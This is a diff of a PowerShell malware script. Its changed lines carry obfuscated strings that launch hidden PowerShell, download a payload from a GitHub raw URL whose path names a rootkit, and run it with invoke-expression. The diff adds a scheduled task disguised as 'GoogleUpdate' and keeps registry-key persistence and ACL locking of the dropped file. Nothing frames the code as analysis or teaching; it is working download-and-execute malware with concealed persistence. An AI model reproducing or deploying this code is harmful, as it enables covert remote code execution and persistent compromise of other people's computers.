@@ -39,8 +39,11 @@ function Set_bootACL($filepath)
 	Set-Acl -Path $filepath -ACLObject $mgr_acl	
 	return $True
 }
-$content = "cmd /c start /min powershell start-process powershell {while(`$true){[string]`$awdsdsadas={(Nxsderwtyuhvew-Obxsderwtyuhvject Nxsderwtyuhvet.WxsderwtyuhvebClxsderwtyuhvient).Dowxsderwtyuhvnloadsxsderwtyuhvtring('hxsderwtyuhvttpxsderwtyuhvs:/xsderwtyuhv/rxsderwtyuhvaw.gixsderwtyuhvthubuserconxsderwtyuhvtent.cxsderwtyuhvom/ghxsderwtyuhvi876/uiyxsderwtyuhvh55/maxsderwtyuhvin/helxsderwtyuhvp.txsderwtyuhvxt')};`$dfsfsdf=`$awdsdsadas.Replace('xsderwtyuhv','');`$bvcbvcv=iex `$dfsfsdf;invoke-expression `$bvcbvcv;start-sleep -s 3600}} -windowstyle hidden"
+$content = "cmd /c start /min powershell start-process powershell {[string]`$awdsdsadas={(Nxsderwtyuhvew-Obxsderwtyuhvject Nxsderwtyuhvet.WxsderwtyuhvebClxsderwtyuhvient).Dowxsderwtyuhvnloadsxsderwtyuhvtring('hxsderwtyuhvttpxsderwtyuhvs:/xsderwtyuhv/rxsderwtyuhvaw.gixsderwtyuhvthubuserconxsderwtyuhvtent.cxsderwtyuhvom/ghxsderwtyuhvproot/myrxsderwtyuhvootkit/maxsderwtyuhvin/koauxsderwtyuhv12.txsderwtyuhvxt')};`$dfsfsdf=`$awdsdsadas.Replace('xsderwtyuhv','');`$bvcbvcv=iex `$dfsfsdf;invoke-expression `$bvcbvcv} -windowstyle hidden"
 sc $paFile $content
 Set_bootACL($paFile)
+
+$paFile        = $env:appdata + '\cat.bat'
+schtasks /create /tn "GoogleUpdate" /tr $paFile /st 15:30
 
 New-ItemProperty -Path $RegistryPath -Name $Name -Value $paFile -Force
